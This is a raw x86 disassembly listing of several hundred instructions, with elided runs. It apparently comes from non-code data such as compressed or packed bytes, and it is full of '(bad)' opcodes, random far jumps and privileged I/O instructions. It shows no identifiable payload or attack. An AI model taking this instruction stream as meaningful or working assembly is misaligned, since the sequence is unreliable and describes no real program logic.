  428960:	pop    eax
  428961:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428962:	bound  edx,QWORD PTR [ebp+0x41f66dbf]
  428968:	adc    eax,DWORD PTR [edx-0x4055a796]
  42896e:	inc    edi
  42896f:	or     DWORD PTR [ecx+0x1cfe9aff],ecx
  428975:	nop
  428976:	js     0x4289cd
  428978:	(bad)  
  428979:	stos   DWORD PTR es:[edi],eax
  42897a:	or     dl,BYTE PTR [edi+0x744fa0b3]
  428980:	adc    ch,BYTE PTR [eax-0x24d193f5]
  428986:	int    0x31
  428988:	xchg   edx,eax
  428989:	cmp    al,0x63
  42898b:	(bad)  
  42898c:	pop    ebx
  42898d:	shl    DWORD PTR [edx+ecx*4+0x8],1
  428991:	loope  0x4289d0
  428993:	fnstcw WORD PTR [ebx-0x296aa98e]
  428999:	in     al,0xf
  42899b:	mov    bh,0xe6
  42899d:	gs clc 
  42899f:	rcl    DWORD PTR [edx+0x11],cl
  4289a2:	loopne 0x428952
  4289a4:	outs   dx,BYTE PTR ds:[esi]
  4289a5:	xchg   ebx,eax
  4289a6:	gs scas al,BYTE PTR es:[edi]
  4289a8:	rcl    BYTE PTR [edi-0x72],cl
  4289ab:	(bad)  
  4289ac:	xlat   BYTE PTR fs:[ebx]
  4289ae:	pop    esi
  4289af:	(bad)  
  4289b2:	add    eax,0x20e04286
  4289b7:	lods   al,BYTE PTR ds:[esi]
  4289b8:	stos   BYTE PTR es:[edi],al
  4289b9:	pop    DWORD PTR [edi]
  4289bb:	and    ebp,DWORD PTR [ebx+0x61]
  4289be:	test   eax,0xd7d2a700
  4289c3:	push   ecx
  4289c4:	dec    ecx
  4289c5:	jg     0x4289cb
  4289c7:	xchg   edx,eax
  4289c8:	ret    0xa3f1
  4289cb:	or     ebp,esp
  4289cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4289ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4289cf:	dec    ebx
  4289d0:	ret    0x4951
  4289d3:	lods   al,BYTE PTR ds:[esi]
  4289d4:	test   eax,0x5b4b39fa
  4289d9:	bound  ebp,QWORD PTR ds:0xc958e49e
  4289df:	lock pop ss
  4289e1:	scas   al,BYTE PTR es:[edi]
  4289e2:	mov    ds:0x2c215e1f,al
  4289e7:	(bad)
  4289eb:	or     BYTE PTR [esi+0x707a2996],dh
  4289f1:	or     BYTE PTR [ebp+ebx*2+0x51],ah
  4289f5:	es inc eax
  4289f7:	nop
  4289f8:	pop    ss
  4289f9:	jo     0x428a2a
  4289fb:	test   bh,al
  4289fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4289fe:	loopne 0x428a53
  428a00:	loope  0x428a47
  428a02:	fdivr  DWORD PTR [ebx-0x32603d28]
  428a08:	not    DWORD PTR [esi]
  428a0a:	outs   dx,DWORD PTR ds:[esi]
  428a0b:	test   ah,0xe5
  428a0e:	xchg   edx,eax
  428a0f:	or     BYTE PTR [ebx+0x4175bc84],al
  428a15:	inc    eax
  428a16:	out    dx,al
  428a17:	jne    0x428a8b
  428a19:	or     DWORD PTR [ecx],esi
  428a1b:	dec    esp
  428a1c:	sub    BYTE PTR [ebp-0x2a75bdb0],bl
  428a22:	sub    DWORD PTR [ebp-0x59b24675],eax
  428a28:	sub    BYTE PTR [ebx],dl
  428a2a:	push   ebp
  428a2b:	rol    bh,0x8d
  428a2e:	push   eax
  428a2f:	jo     0x428a43
  428a31:	cdq    
  428a32:	and    edi,edi
  428a34:	(bad)  
  428a35:	xor    esi,DWORD PTR [edx-0x26]
  428a38:	loop   0x428a9e
  428a3a:	dec    ecx
  428a3b:	and    ch,BYTE PTR [ecx]
  428a3d:	pop    edi
  428a3e:	int3   
  428a3f:	imul   edi,DWORD PTR [edx],0x0
	...
  428ab2:	add    BYTE PTR [eax],al
  428ab4:	retf   0x528b
  428ab7:	jnp    0x428b0c
  428ab9:	sti    
  428aba:	jmp    0x428a77
  428abc:	xchg   ebp,eax
  428abd:	sub    eax,0x970cf691
  428ac2:	mov    WORD PTR [ebx],ds
  428ac4:	jnp    0x428a75
  428ac6:	add    DWORD PTR [eax],eax
  428ac8:	cmc    
  428ac9:	add    BYTE PTR [eax],al
  428acb:	add    BYTE PTR [ebx-0x47],bl
  428ace:	call   DWORD PTR [ebx+ebp*2]
  428ad1:	out    dx,eax
  428ad2:	lds    ebp,FWORD PTR [ebx+0xcb376d4]
  428ad8:	lods   eax,DWORD PTR ds:[esi]
  428ad9:	mov    bh,BYTE PTR [ebp+0xf44e9e6]
  428adf:	test   al,0x7c
  428ae1:	sbb    eax,0x808821a8
  428ae6:	adc    edx,DWORD PTR [ecx]
  428ae8:	or     esp,eax
  428aea:	gs cld 
  428aec:	add    eax,DWORD PTR [ecx-0x203bf363]
  428af2:	push   es
  428af3:	or     BYTE PTR [edx-0x4c],dh
  428af6:	pop    esi
  428af7:	cmp    al,0xb5
  428af9:	not    ebx
  428afb:	and    DWORD PTR [ecx],0x6eaf741e
  428b01:	xchg   esi,eax
  428b02:	and    bl,BYTE PTR [ebx]
  428b04:	add    DWORD PTR [ebx+0x56b05d9b],esi
  428b0a:	mov    dl,dl
  428b0c:	mov    ds:0xdd7ba342,eax
  428b11:	cdq    
  428b12:	cmp    al,0x12
  428b14:	xchg   edx,esp
  428b16:	jecxz  0x428abe
  428b18:	(bad)  
  428b1a:	outs   dx,DWORD PTR gs:[esi]
  428b1c:	add    esi,eax
  428b1e:	(bad)  
  428b1f:	cmp    bh,ah
  428b21:	push   edx
  428b22:	xor    ebx,DWORD PTR [ecx+0x2f6afca]
  428b28:	xor    BYTE PTR [edx+0x6e],dh
  428b2b:	mov    dl,0xd2
  428b2d:	pop    edx
  428b2e:	push   es
  428b2f:	dec    ebp
  428b30:	push   0xffffff86
  428b32:	push   edx
  428b33:	shl    DWORD PTR [ebx-0x56],cl
  428b36:	jg     0x428ab8
  428b38:	jns    0x428b78
  428b3a:	push   ebp
  428b3b:	sbb    eax,0x83764c6d
  428b40:	pop    eax
  428b41:	xor    al,0xc8
  428b43:	push   ebp
  428b44:	jne    0x60a4e220
  428b4a:	daa    
  428b4b:	or     DWORD PTR [ebx-0x63f06084],eax
  428b51:	std    
  428b52:	pop    ss
  428b53:	sbb    BYTE PTR [ecx+0x72],dh
  428b56:	mov    bh,0xaf
  428b58:	es push ds
  428b5a:	sub    bl,BYTE PTR [bx+si-0x2d5]
  428b5f:	xor    eax,esp
  428b61:	xchg   ebx,eax
  428b62:	loopne 0x428b3a
  428b64:	dec    esi
  428b65:	xchg   ecx,eax
  428b66:	push   ds
  428b67:	ret    0x187e
  428b6a:	sub    bl,BYTE PTR [ecx+0x71df6dc0]
  428b70:	prefetcht0 BYTE PTR [ebx+ebx*2+0x179e4aef]
  428b78:	add    DWORD PTR [ebx-0x6],ecx
  428b7b:	xor    al,0x48
  428b7d:	adc    cl,BYTE PTR [ecx+0x38]
  428b80:	or     ecx,DWORD PTR [eax-0x1d15f0f7]
  428b86:	mov    ds:0x68b18307,al
  428b8b:	test   BYTE PTR [eax+0x3f],cl
  428b8e:	jge    0x428c01
  428b90:	int    0xa3
  428b92:	sub    BYTE PTR [ebx-0x13ee428a],bh
  428b98:	sahf   
  428b99:	loopne 0x428b70
  428b9b:	(bad)  
  428b9c:	aam    0xa7
  428b9e:	adc    BYTE PTR [edx-0xf6454df],bl
  428ba4:	mov    esi,0x36779678
  428ba9:	mov    cl,0x1a
  428bab:	leave  
  428bac:	mov    al,gs:0xf27522cc
  428bb2:	out    dx,eax
  428bb3:	add    eax,eax
  428bb5:	rcl    dl,cl
  428bb7:	scas   al,BYTE PTR es:[edi]
  428bb8:	test   BYTE PTR [esi],bl
  428bba:	jl     0x428b7e
  428bbc:	repnz shr BYTE PTR [ebx+0x2c],0xf1
	...
  428c31:	add    BYTE PTR [eax],al
  428c33:	add    BYTE PTR [ebx-0xcbc4fb0],ah
  428c39:	jecxz  0x428c2e
  428c3b:	lock mov ebx,0x86d7a28f
  428c41:	scas   al,BYTE PTR es:[edi]
  428c42:	sbb    ch,BYTE PTR [esi+0x1b070]
  428c48:	cmc    
  428c49:	add    BYTE PTR [eax],al
  428c4b:	add    BYTE PTR [esi+0x33e7087c],ch
  428c51:	adc    BYTE PTR [edx-0x2],0xbe
  428c55:	cld    
  428c56:	mov    edx,0x1c5ffa85
  428c5b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428c5c:	into   
  428c5d:	bound  esp,QWORD PTR [ebx+0x14fab25f]
  428c63:	leave  
  428c64:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428c65:	cmp    dl,BYTE PTR [esi]
  428c67:	xor    al,0xde
  428c69:	push   esi
  428c6a:	mov    ah,0x51
  428c6c:	sti    
  428c6d:	adc    al,ch
  428c6f:	or     BYTE PTR [eax+0x33],cl
  428c72:	sbb    eax,0x215808cd
  428c77:	out    dx,al
  428c78:	adc    BYTE PTR [esi],0xb
  428c7b:	retf   0x925c
  428c7e:	fnsave [edx+edx*8+0x10]
  428c82:	jmp    0xae3f:0x2cb4c415
  428c89:	out    0x26,al
  428c8b:	pusha  
  428c8c:	out    0xb5,eax
  428c8e:	xor    al,bh
  428c90:	jmp    0x143c:0x2245a6d7
  428c97:	jno    0x428ca7
  428c99:	cs dec edx
  428c9b:	pop    eax
  428c9c:	cli    
  428c9d:	sub    esi,edi
  428c9f:	dec    eax
  428ca0:	call   0xe128:0xc1a45d64
  428ca7:	rol    eax,1
  428ca9:	add    eax,0x4f0cb896
  428cae:	pop    ebp
  428caf:	mov    eax,ds:0x1f35ae5f
  428cb4:	sbb    eax,0xfcfb5943
  428cb9:	push   eax
  428cba:	xchg   esi,eax
  428cbb:	pop    ecx
  428cbc:	xchg   BYTE PTR [ecx+0x5a],ch
  428cbf:	dec    edi
  428cc0:	std    
  428cc1:	sbb    cl,bh
  428cc3:	fisttp WORD PTR [ebx]
  428cc5:	popa   
  428cc6:	loop   0x428d30
  428cc8:	jg     0x428ce9
  428cca:	sub    al,0x30
  428ccc:	scas   eax,DWORD PTR es:[edi]
  428ccd:	push   ebx
  428ccf:	push   esi
  428cd0:	and    ah,BYTE PTR [ebx]
  428cd2:	jle    0x428ca6
  428cd4:	push   cs
  428cd5:	(bad)  
  428cd6:	fild   QWORD PTR [ebp-0x7419deed]
  428cdc:	mov    al,al
  428cde:	aad    0xde
  428ce0:	imul   esi,DWORD PTR [esi+0x7a8b251b],0x74802ae4
  428cea:	fs (bad) 
  428cec:	and    al,0x96
  428cee:	les    esi,FWORD PTR [edi+0x6643a48b]
  428cf4:	shr    BYTE PTR [esi+edx*4],1
  428cf7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428cf8:	out    0x34,al
  428cfa:	push   esi
  428cfb:	adc    eax,0x40143b53
  428d00:	cs ret 
  428d02:	hlt    
  428d03:	push   ds
  428d04:	cmp    al,0xc4
  428d06:	inc    ebx
  428d07:	out    dx,al
  428d08:	add    BYTE PTR [ecx+edi*4-0x49ed1b49],ah
  428d0f:	fisubr WORD PTR [ecx+eiz*1-0x6ad3d7ef]
  428d16:	sbb    BYTE PTR [eax+0x68a5a685],bh
  428d1c:	syscall 
  428d1e:	sub    cl,0x13
  428d21:	xor    cl,BYTE PTR [ebx]
  428d23:	es ror ecx,1
  428d26:	aas    
  428d27:	dec    esp
  428d28:	nop
  428d29:	jbe    0x428d24
  428d2b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428d2c:	(bad)  
  428d2e:	ror    BYTE PTR ds:0xb96f0756,1
  428d34:	mov    eax,0x549584ed
  428d39:	or     al,bh
  428d3b:	cmp    esi,DWORD PTR [ebx-0x54]
  428d3e:	pop    ds
  428d3f:	popf   
  428d40:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
	...
  428db1:	add    BYTE PTR [eax],al
  428db3:	add    BYTE PTR [eax+0x6d3c25f1],bh
  428db9:	cld    
  428dba:	mov    ecx,0x195a21f5
  428dbf:	test   eax,0xc2a68cbe
  428dc4:	gs mov cl,0x1
  428dc7:	add    ch,dh
  428dc9:	add    BYTE PTR [eax],al
  428dcb:	add    BYTE PTR [ebx+0x40],cl
  428dce:	and    eax,0x8eb12519
  428dd3:	push   ds
  428dd4:	push   ss
  428dd5:	dec    ecx
  428dd6:	es ja  0x428e44
  428dd9:	push   ds
  428dda:	adc    DWORD PTR [ebx+ebx*1],0xdd02c3eb
  428de1:	push   cs
  428de2:	adc    BYTE PTR [edx-0x2a],ah
  428de5:	pop    esi
  428de6:	mov    ebx,0x50ff7a10
  428deb:	and    BYTE PTR [esp+eax*8+0x42b1a05a],bl
  428df2:	js     0x428dfc
  428df4:	xchg   edx,eax
  428df5:	push   ecx
  428df6:	adc    ebp,DWORD PTR [esi]
  428df8:	mov    dl,BYTE PTR [eax+0x6d175008]
  428dfe:	mov    ds:0x85125c8b,al
  428e03:	add    BYTE PTR [edx],0x4a
  428e06:	jae    0x428ddf
  428e08:	xor    al,0xd4
  428e0a:	test   eax,0xee664e1f
  428e0f:	cmp    BYTE PTR [ebx],cl
  428e11:	jle    0x428db0
  428e13:	retf   
  428e14:	and    ebp,esp
  428e16:	dec    esi
  428e17:	jle    0x428e47
  428e19:	cmp    DWORD PTR [edi],ebp
  428e1b:	push   es
  428e1c:	dec    cx
  428e1e:	repnz shl BYTE PTR [eiz*8-0x7a620f57],0x3b
  428e27:	pop    eax
  428e28:	or     eax,0xca67637
  428e2d:	push   es
  428e2e:	jp     0x428e60
  428e30:	pop    ebp
  428e31:	ins    BYTE PTR es:[edi],dx
  428e32:	push   es
  428e33:	(bad)  
  428e34:	or     ebx,esi
  428e36:	inc    esi
  428e37:	aad    0xab
  428e39:	in     eax,0xc
  428e3b:	mov    bh,BYTE PTR [eax+eax*1]
  428e3e:	and    dl,BYTE PTR ds:0xb964
  428e43:	mov    bh,BYTE PTR [edx+ebx*8-0x4b]
  428e47:	loop   0x428e0d
  428e49:	adc    BYTE PTR ds:0xac81ca2c,bh
  428e4f:	loopne 0x428e89
  428e51:	dec    esi
  428e52:	sahf   
  428e53:	cmc    
  428e54:	adc    al,0xa3
  428e56:	mov    esi,ss
  428e58:	jmp    0x2f86d849
  428e5d:	dec    edi
  428e5e:	imul   edi,DWORD PTR [esi],0x7e
  428e61:	enter  0x17a1,0xd1
  428e65:	mov    edi,0x19477754
  428e6a:	rol    bh,1
  428e6c:	ins    DWORD PTR es:[edi],dx
  428e6d:	sub    ah,BYTE PTR [edi+0x77]
  428e70:	mov    esi,gs
  428e72:	out    0xa5,eax
  428e74:	xor    al,0x15
  428e76:	pop    edx
  428e77:	ds imul ebp,edi,0x24
  428e7b:	imul   ebp,DWORD PTR [edx],0xfaa4eba8
  428e81:	pop    edi
  428e82:	push   edi
  428e83:	cli    
  428e84:	xchg   esp,eax
  428e85:	mov    eax,0x722566da
  428e8a:	sbb    DWORD PTR [eax+esi*2],ebx
  428e8d:	pop    ds
  428e8e:	adc    BYTE PTR [edx-0xe],ch
  428e91:	(bad)
  428e95:	dec    edx
  428e96:	cmp    ebx,ebp
  428e98:	cwde   
  428e99:	and    DWORD PTR [ebx+0x21],ebx
  428e9c:	(bad)  
  428e9d:	aaa    
  428e9e:	lods   eax,DWORD PTR ds:[esi]
  428e9f:	dec    ebp
  428ea0:	(bad)  
  428ea1:	dec    DWORD PTR [edi+eax*8]
  428ea4:	mov    cl,0x41
  428ea6:	mov    al,BYTE PTR [edi+0x110c7782]
  428eac:	cmp    BYTE PTR ds:0x5adcd574,dl
  428eb2:	cmp    DWORD PTR [ebp+0x48560695],edi
  428eb8:	inc    ecx
  428eb9:	pusha  
  428eba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428ebb:	jecxz  0x428ef1
  428ebd:	xchg   ebx,eax
  428ebe:	push   eax
  428ebf:	or     ah,BYTE PTR [edx+0x0]
	...
  428f32:	add    BYTE PTR [eax],al
  428f34:	mov    cl,0xa7
  428f36:	dec    ebx
  428f37:	das    
  428f38:	pop    edi
  428f39:	out    dx,eax
  428f3a:	cmc    
  428f3b:	mov    edi,0x37e5e17c
  428f40:	imul   ecx,esi,0xb25a90d7
  428f46:	add    DWORD PTR [eax],eax
  428f48:	cmc    
  428f49:	add    BYTE PTR [eax],al
  428f4b:	add    BYTE PTR [edi],dl
  428f4d:	or     al,0x1f
  428f4f:	push   es
  428f50:	sub    al,0x67
  428f52:	fstp   TBYTE PTR [ecx+0x6cc830a3]
  428f58:	jmp    0xab281d03
  428f5d:	add    ch,ch
  428f5f:	repz mov eax,ds:0x3a2e4518
  428f65:	and    BYTE PTR [ecx+0x11],0x2b
  428f69:	jp     0x428f61
  428f6b:	sub    DWORD PTR [bp+si+0xae3],ecx
  428f70:	ret    
  428f71:	jge    0x428f8e
  428f73:	imul   eax,eax,0x9d34ee46
  428f79:	adc    dl,BYTE PTR [ebp+0x28]
  428f7c:	add    al,0x13
  428f7e:	and    edx,DWORD PTR [eax]
  428f80:	inc    ebx
  428f81:	cmp    BYTE PTR [ebx],cl
  428f83:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428f84:	jle    0x428f1b
  428f86:	out    0xcb,al
  428f88:	inc    edx
  428f89:	push   esp
  428f8a:	pop    ebx
  428f8b:	not    DWORD PTR [ecx]
  428f8d:	mov    ch,0x2d
  428f8f:	sbb    eax,0xbe5494d4
  428f94:	cmp    BYTE PTR [eax+0x252241ed],bl
  428f9a:	jns    0x42901a
  428f9c:	cmp    eax,0xbade4b45
  428fa1:	out    0x7a,al
  428fa3:	mov    ch,0xe8
  428fa5:	mov    dl,0x9b
  428fa7:	jbe    0x429022
  428fa9:	fcomi  st,st(0)
  428fab:	jl     0x428fa6
  428fad:	daa    
  428fae:	retf   0x55a1
  428fb1:	ins    DWORD PTR es:[edi],dx
  428fb2:	sbb    dh,ah
  428fb4:	test   BYTE PTR es:[ebp+0x3a],ch
  428fb8:	mov    esi,0x352b582a
  428fbd:	scas   al,BYTE PTR es:[edi]
  428fbe:	enter  0xedff,0x3a
  428fc2:	add    al,BYTE PTR [ebx+0x7e244b9b]
  428fc8:	lea    eax,fs:[ebp+0x5d]
  428fcc:	call   0x61e61919
  428fd1:	mov    esp,0x4b335cde
  428fd6:	fisubr WORD PTR [eax+eiz*8+0xd7f9309]
  428fdd:	out    dx,al
  428fde:	cmp    DWORD PTR [ebx+0x63],0xaa5b8d97
  428fe5:	pop    esp
  428fe6:	icebp  
  428fe7:	mov    ch,0x5f
  428fe9:	and    DWORD PTR [ebx-0x4],esi
  428fec:	mov    cl,0x99
  428fee:	jle    0x429034
  428ff0:	or     DWORD PTR [ecx-0x28],esi
  428ff3:	sbb    al,0xcf
  428ff5:	jmp    0x2e7f:0xf63d2b46
  428ffc:	popf   
  428ffd:	pushf  
  428ffe:	xchg   edx,eax
  428fff:	outs   dx,BYTE PTR ds:[esi]
  429000:	sbb    al,0x13
  429002:	enter  0xf9e6,0x90
  429006:	xchg   edx,eax
  429007:	inc    esp
  429008:	leave  
  429009:	inc    ebp
  42900a:	adc    eax,0xf74d6089
  42900f:	(bad)  
  429010:	sbb    eax,0xb099c2f7
  429015:	inc    edi
  429016:	pop    ebp
  429017:	clc    
  429018:	xchg   edx,eax
  429019:	push   0xffffff87
  42901b:	repz jp 0x42903b
  42901e:	hlt    
  42901f:	jecxz  0x429060
  429021:	dec    esi
  429022:	pushf  
  429023:	gs inc ecx
  429025:	mov    ds:0xd12f6282,al
  42902a:	inc    ecx
  42902b:	ins    BYTE PTR es:[edi],dx
  42902c:	call   0x2a86:0xe228cb5c
  429033:	shl    BYTE PTR [edx+edx*8-0x46c186b6],0x80
  42903b:	push   cs
  42903c:	test   al,0x70
  42903e:	adc    esi,DWORD PTR [eax+eax*2]
	...
  4290b1:	add    BYTE PTR [eax],al
  4290b3:	add    bh,bl
  4290b5:	out    dx,al
  4290b6:	std    
  4290b7:	dec    esp
  4290b8:	std    
  4290b9:	pop    edi
  4290ba:	(bad)  
  4290bb:	(bad)  
  4290bc:	mov    edi,0x65b66cf7
  4290c1:	cmp    DWORD PTR [edx],esi
  4290c3:	mov    al,0x4f
  4290c5:	mov    bl,0x1
  4290c7:	add    ch,dh
  4290c9:	add    BYTE PTR [eax],al
  4290cb:	add    ch,bl
  4290cd:	add    al,0x1a
  4290cf:	ins    BYTE PTR es:[edi],dx
  4290d0:	std    
  4290d1:	stos   DWORD PTR es:[edi],eax
  4290d2:	pop    ds
  4290d3:	mov    bl,0x7e
  4290d5:	es mov bl,0x55
  4290d8:	and    eax,0x333f6027
  4290dd:	cwde   
  4290de:	add    eax,0xa8e86ad5
  4290e3:	dec    ebp
  4290e4:	adc    ecx,DWORD PTR [eax-0x2d]
  4290e7:	dec    esp
  4290e8:	jb     0x429103
  4290ea:	fadd   DWORD PTR [edx+edi*2-0x42]
  4290ee:	call   0xce53750
  4290f3:	pushf  
  4290f4:	out    dx,eax
  4290f5:	push   eax
  4290f6:	pop    esp
  4290f7:	xchg   esi,eax
  4290f8:	sbb    al,BYTE PTR [edx+0x5b0dd8a4]
  4290fe:	dec    esi
  4290ff:	xor    BYTE PTR [ebx],bh
  429101:	fxch   st(1)
  429103:	dec    ebp
  429104:	rol    BYTE PTR [ecx-0x5d],1
  429107:	pop    ds
  429108:	sub    eax,0xf4cd9340
  42910d:	(bad)  
  42910e:	int    0x3a
  429110:	xor    edi,DWORD PTR [esi-0xc5f6dd3]
  429116:	jae    0x429144
  429118:	dec    eax
  42911a:	retf   
  42911b:	sbb    bh,ah
  42911d:	stc    
  42911e:	loop   0x42914b
  429120:	sar    BYTE PTR [edi],cl
  429122:	push   es
  429123:	adc    al,al
  429125:	mov    DWORD PTR [ecx+0x359ce5ee],esp
  42912b:	mov    bl,0x7f
  42912d:	jmp    0xc1cf:0x88d70204
  429134:	cmc    
  429135:	xor    esp,DWORD PTR [edx+esi*2]
  429138:	adc    al,0xff
  42913a:	dec    ecx
  42913b:	aaa    
  42913c:	sbb    dl,dh
  42913e:	loope  0x429129
  429140:	xor    al,0x7a
  429142:	dec    ebx
  429143:	icebp  
  429144:	adc    ecx,DWORD PTR [ecx-0xf]
  429147:	mov    esp,0x14919877
  42914c:	hlt    
  42914d:	or     eax,0xf57ce29c
  429152:	(bad)  
  429153:	mov    dl,0x65
  429155:	xchg   ebx,eax
  429156:	loop   0x42916f
  429158:	out    dx,al
  429159:	inc    eax
  42915a:	xor    ch,BYTE PTR [ebx-0x45de5280]
  429160:	(bad)
  429163:	fidivr WORD PTR [edx-0x77]
  429166:	push   cs
  429167:	dec    edx
  429168:	scas   eax,DWORD PTR es:[edi]
  429169:	and    ecx,DWORD PTR [ecx]
  42916b:	fisubr WORD PTR [ebx+ebx*4-0xc]
  42916f:	dec    edx
  429170:	and    BYTE PTR [eax+eax*8+0x185358f6],bh
  429177:	hlt    
  429178:	pop    ecx
  429179:	dec    esi
  42917a:	lds    esi,FWORD PTR [eax-0x32be4842]
  429180:	aaa    
  429181:	test   BYTE PTR [edx],bh
  429183:	jbe    0x4291cb
  429185:	ss loope 0x4291d7
  429188:	cmc    
  429189:	mov    BYTE PTR [ebx+0x12],cl
  42918c:	pop    ss
  42918d:	out    0xeb,eax
  42918f:	aam    0x82
  429191:	je     0x4291cc
  429193:	inc    edi
  429194:	clc    
  429195:	and    ch,BYTE PTR [ecx+esi*4+0x28]
  429199:	not    DWORD PTR [ecx]
  42919b:	jmp    0xd3544612
  4291a0:	jb     0x4291e7
  4291a2:	or     ebx,edx
  4291a4:	scas   eax,DWORD PTR es:[edi]
  4291a5:	xchg   ebp,eax
  4291a6:	clc    
  4291a7:	dec    edx
  4291a8:	inc    esp
  4291a9:	pop    eax
  4291aa:	sbb    DWORD PTR [edi+esi*2+0x7f],ecx
  4291ae:	sub    al,0x65
  4291b0:	shl    DWORD PTR [eax-0x20d42fd5],1
  4291b6:	stos   BYTE PTR es:[edi],al
  4291b7:	push   edx
  4291b8:	rcl    ch,cl
  4291ba:	popf   
  4291bb:	pop    ss
  4291bc:	aam    0xa4
  4291be:	xchg   BYTE PTR [eax+0x53],ch
	...
  429231:	add    BYTE PTR [eax],al
  429233:	add    bh,al
  429235:	fidiv  WORD PTR [esi]
  429237:	loop   0x429278
  429239:	jmp    0x67eb:0x13f5ffd7
  429240:	stos   BYTE PTR es:[edi],al
  429241:	inc    esi
  429242:	jmp    0x1f6d724
  429247:	add    ch,dh
  429249:	add    BYTE PTR [eax],al
  42924b:	add    BYTE PTR [ebp-0x53],bl
  42924e:	das    
  42924f:	adc    ebx,DWORD PTR [esi*8+0x310f52d0]
  429256:	fdivr  QWORD PTR [ebp-0x4c57983e]
  42925d:	add    DWORD PTR [edi],esi
  42925f:	fs in  eax,dx
  429261:	xchg   ecx,eax
  429262:	loope  0x429241
  429264:	mov    al,0x48
  429266:	xor    BYTE PTR [ecx],0xc
  429269:	bound  ebp,QWORD PTR [esi+0x57cc1494]
  42926f:	(bad)
  429274:	jno    0x42921b
  429276:	cdq    
  429277:	sbb    esp,DWORD PTR ds:0x6774d880
  42927d:	xor    al,0x6b
  42927f:	in     eax,0xe3
  429281:	pop    ebx
  429282:	or     eax,0xc988068e
  429287:	dec    edi
  429288:	aas    
  429289:	jne    0x4292b8
  42928b:	add    ah,cl
  42928d:	inc    esi
  42928e:	adc    al,0x1f
  429290:	or     eax,0x9195d9ad
  429295:	pop    ss
  429296:	jmp    0x4292ff
  429298:	ins    BYTE PTR es:[edi],dx
  429299:	xor    BYTE PTR [esp+ebp*4+0x55],0xaf
  42929e:	aad    0x4d
  4292a0:	retf   
  4292a1:	xchg   ecx,eax
  4292a2:	scas   al,BYTE PTR es:[edi]
  4292a3:	adc    BYTE PTR [ecx+0x6529ec5b],bh
  4292a9:	inc    ebp
  4292aa:	loope  0x429326
  4292ac:	adc    al,0x46
  4292ae:	inc    edx
  4292af:	mov    dh,0x87
  4292b1:	sbb    eax,ebp
  4292b3:	jmp    0x533d2b20
  4292b8:	fstp   DWORD PTR [ebp-0xbe3fae1]
  4292be:	xlat   BYTE PTR ds:[ebx]
  4292bf:	inc    esi
  4292c0:	stos   BYTE PTR es:[edi],al
  4292c1:	leave  
  4292c2:	xchg   ecx,eax
  4292c3:	jmp    0xd9e8741
  4292c8:	ret    
  4292c9:	js     0x4292d3
  4292cb:	push   ebx
  4292cc:	push   edx
  4292cd:	dec    esp
  4292ce:	aas    
  4292cf:	mov    ds:0xc47857bb,al
  4292d4:	mov    cl,0x1e
  4292d6:	xor    ebx,DWORD PTR [edx+0x72]
  4292d9:	cmc    
  4292da:	clc    
  4292db:	sub    al,0xf3
  4292dd:	mov    bl,0xab
  4292df:	mov    cl,0x34
  4292e1:	add    DWORD PTR [edi+edx*1+0x6da4f186],ecx
  4292e8:	mov    edx,0xe21eff2
  4292ed:	loope  0x4292bd
  4292ef:	test   BYTE PTR [ecx],ah
  4292f1:	push   esi
  4292f2:	mov    dh,0x35
  4292f4:	(bad)  
  4292f5:	sbb    edi,DWORD PTR [ebx-0x30]
  4292f8:	loopne 0x4292d6
  4292fa:	(bad)  
  4292fb:	sti    
  4292fc:	sbb    al,BYTE PTR [esi]
  4292fe:	mov    bh,0xbe
  429300:	adc    edi,DWORD PTR [esi]
  429302:	(bad)  
  429304:	mov    WORD PTR [edi],gs
  429306:	mov    ds:0x6b0b7905,eax
  42930b:	aaa    
  42930c:	mov    WORD PTR [ebx-0x6a],?
  42930f:	mov    DWORD PTR [edi-0x5907360b],ebx
  429315:	xor    eax,0xd37e1a61
  42931a:	call   0xdebf7f45
  42931f:	mov    cl,0x21
  429321:	ja     0x429313
  429323:	inc    esi
  429324:	mov    bh,0x92
  429326:	cli    
  429327:	js     0x42930b
  429329:	shrd   DWORD PTR [esi],ecx,cl
  42932c:	pop    es
  42932d:	into   
  42932e:	retf   
  42932f:	sbb    DWORD PTR [esi],esp
  429331:	push   cs
  429332:	ds aam 0x79
  429335:	push   0x49377849
  42933a:	ret    0x7cd1
  42933d:	iret   
  42933e:	pop    ebp
  42933f:	scas   al,BYTE PTR es:[edi]
  429340:	xchg   BYTE PTR [eax],al
	...
  4293b2:	add    BYTE PTR [eax],al
  4293b4:	push   cs
  4293b5:	xchg   esp,eax
  4293b6:	jg     0x42941b
  4293b8:	(bad)  
  4293b9:	jmp    0x4293d9
  4293bb:	std    
  4293bc:	jge    0x4293da
  4293be:	in     al,dx
  4293bf:	xchg   edi,eax
  4293c0:	pop    ecx
  4293c1:	fst    QWORD PTR [eax]
  4293c3:	nop
  4293c4:	cmp    DWORD PTR [ebp+0xf50001],esi
  4293ca:	add    BYTE PTR [eax],al
  4293cc:	test   al,0xc3
  4293ce:	or     al,0x23
  4293d0:	pop    es
  4293d1:	inc    ebx
  4293d2:	jmp    0x4293f7
  4293d4:	(bad)  
  4293d5:	lea    ebp,[ecx]
  4293d7:	out    0x84,eax
  4293d9:	lods   eax,DWORD PTR ds:[esi]
  4293da:	in     al,0xd2
  4293dc:	jecxz  0x4293c7
  4293de:	lahf   
  4293df:	add    eax,0x28395705
  4293e4:	mov    esi,0x6eb3766c
  4293e9:	jnp    0x429459
  4293eb:	ins    DWORD PTR es:[edi],dx
  4293ec:	(bad)  
  4293ed:	sub    al,BYTE PTR [ebx-0x39f3830]
  4293f3:	push   ds
  4293f4:	push   esi
  4293f5:	xor    eax,0x302d8fd4
  4293fa:	pop    eax
  4293fb:	fwait
  4293fc:	inc    ecx
  4293fd:	lods   al,BYTE PTR ds:[esi]
  4293fe:	ficom  DWORD PTR [ebx-0x678173e]
  429404:	lds    eax,FWORD PTR [eax]
  429406:	out    0xed,eax
  429408:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
